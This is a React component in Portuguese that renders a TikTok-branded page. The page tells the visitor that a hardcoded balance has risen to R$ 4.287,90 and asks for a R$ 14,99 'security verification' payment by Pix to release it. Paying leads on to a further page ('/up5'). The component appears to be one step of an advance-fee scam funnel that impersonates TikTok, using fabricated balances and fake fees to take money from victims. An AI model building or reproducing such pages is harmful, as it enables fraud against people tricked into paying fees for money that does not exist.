import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import MoneyForPayPopup from '@/components/MoneyForPayPopup';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_ANTIGO = 2834.72;
const SALDO_NOVO = 4287.90;
const TAXA_UPGRADE = 14.99;
const TAXA_UPGRADE_CENTAVOS = 1499;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up4 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Upgrade Premium', TAXA_UPGRADE);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up5');
  };

  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '120px' }}>
      {/* Header */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '16px',
        gap: '6px',
      }}>
        <img src="/images/tiktok-logo.png" alt="TikTok" style={{ height: '28px' }} />
      </div>

      {/* Status Badge */}
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        marginBottom: '16px',
      }}>
        <div style={{
          backgroundColor: '#f1f1f1',
          padding: '8px 16px',
          borderRadius: '4px',
          fontSize: '12px',
          fontWeight: 600,
          color: '#000',
          display: 'flex',
          alignItems: 'center',
          gap: '6px',
        }}>
          STATUS: UPGRADE DISPONÍVEL <span style={{ fontSize: '14px' }}>✅</span>
        </div>
      </div>

      {/* Main Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '24px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <h1 style={{
          fontSize: '22px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 16px',
          lineHeight: 1.3,
        }}>
          Seu limite de recebimento foi expandido para R$ {formatBR(SALDO_NOVO)}
        </h1>

        <p style={{
          fontSize: '14px',
          color: '#444',
          margin: '0 0 20px',
          lineHeight: 1.6,
        }}>
          Identificamos um histórico positivo no seu perfil. Por isso, sua conta está elegível para a categoria{' '}
          <span style={{ color: '#000', fontWeight: 600 }}>PREMIUM VITALÍCIO</span>, permitindo o acesso imediato a valores acumulados superiores.
        </p>

        {/* Info Box */}
        <div style={{
          backgroundColor: '#f8f9fb',
          borderRadius: '8px',
          padding: '16px',
          marginBottom: '20px',
        }}>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
            marginBottom: '12px',
          }}>
            <span style={{ fontSize: '14px' }}>ⓘ</span>
            <span style={{ fontSize: '13px', fontWeight: 600, color: '#000' }}>
              RESUMO DA ATUALIZAÇÃO DE CONTA
            </span>
          </div>

          <p style={{
            fontSize: '13px',
            color: '#444',
            margin: '0 0 12px',
            lineHeight: 1.5,
          }}>
            No perfil "Básico", sua solicitação atual seria de R$ {formatBR(SALDO_ANTIGO)}.
          </p>

          <p style={{
            fontSize: '13px',
            color: '#444',
            margin: '0 0 12px',
            lineHeight: 1.5,
          }}>
            Com a validação Premium, o sistema recalcula o total, somando os bônus pendentes. O novo valor integral disponível passa a ser{' '}
            <span style={{ fontWeight: 600, color: '#000' }}>R$ {formatBR(SALDO_NOVO)}</span>.
          </p>

          <p style={{
            fontSize: '13px',
            color: '#444',
            margin: 0,
            lineHeight: 1.5,
          }}>
            Para confirmar essa alteração de categoria e habilitar o recebimento do valor maior, é necessária apenas a validação de segurança.
          </p>
        </div>

        {/* Benefits List */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px',
            backgroundColor: '#f8f9fb',
            padding: '14px',
            borderRadius: '8px',
          }}>
            <div style={{
              width: '32px',
              height: '32px',
              borderRadius: '50%',
              backgroundColor: '#fff',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
            }}>
              <span style={{ fontSize: '14px' }}>↑</span>
            </div>
            <div>
              <span style={{ fontSize: '14px', fontWeight: 600, color: '#000' }}>Ajuste de Saldo: </span>
              <span style={{ fontSize: '14px', color: '#444' }}>
                Valor atualizado de R$ {formatBR(SALDO_ANTIGO)} para R$ {formatBR(SALDO_NOVO)}.
              </span>
            </div>
          </div>

          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px',
            backgroundColor: '#f8f9fb',
            padding: '14px',
            borderRadius: '8px',
          }}>
            <div style={{
              width: '32px',
              height: '32px',
              borderRadius: '50%',
              backgroundColor: '#fff',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
            }}>
              <span style={{ fontSize: '14px' }}>⚡</span>
            </div>
            <div>
              <span style={{ fontSize: '14px', fontWeight: 600, color: '#000' }}>Processamento Prioritário: </span>
              <span style={{ fontSize: '14px', color: '#444' }}>
                Transferência imediata via sistema automático.
              </span>
            </div>
          </div>

          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px',
            backgroundColor: '#f8f9fb',
            padding: '14px',
            borderRadius: '8px',
          }}>
            <div style={{
              width: '32px',
              height: '32px',
              borderRadius: '50%',
              backgroundColor: '#fff',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
            }}>
              <span style={{ fontSize: '14px' }}>✓</span>
            </div>
            <div>
              <span style={{ fontSize: '14px', fontWeight: 600, color: '#000' }}>Conta Verificada: </span>
              <span style={{ fontSize: '14px', color: '#444' }}>
                Isenção de verificações futuras.
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Fixed Bottom Button */}
      <div style={{
        position: 'fixed',
        bottom: 0,
        left: 0,
        right: 0,
        padding: '16px',
        backgroundColor: '#fff',
        boxShadow: '0 -2px 10px rgba(0,0,0,0.05)',
      }}>
        <button
          onClick={() => setShowPixPopup(true)}
          style={{
            width: '100%',
            padding: '16px',
            backgroundColor: '#16a34a',
            color: '#fff',
            border: 'none',
            borderRadius: '99px',
            fontSize: '15px',
            fontWeight: 600,
            cursor: 'pointer',
          }}
        >
          Confirmar Upgrade e Receber R$ {formatBR(SALDO_NOVO)}
        </button>
        <p style={{
          fontSize: '12px',
          color: '#16a34a',
          textAlign: 'center',
          marginTop: '8px',
          marginBottom: 0,
        }}>
          Verificação única de R$ {formatBR(TAXA_UPGRADE)}
        </p>
      </div>

      {showPixPopup && (
        <MoneyForPayPopup
          amount={TAXA_UPGRADE_CENTAVOS}
          productName="Upgrade Premium TikTok"
          pageOrigin="Up4"
          onSuccess={handlePaymentSuccess}
          onClose={() => setShowPixPopup(false)}
        />
      )}
    </main>
  );
};

export default Up4;
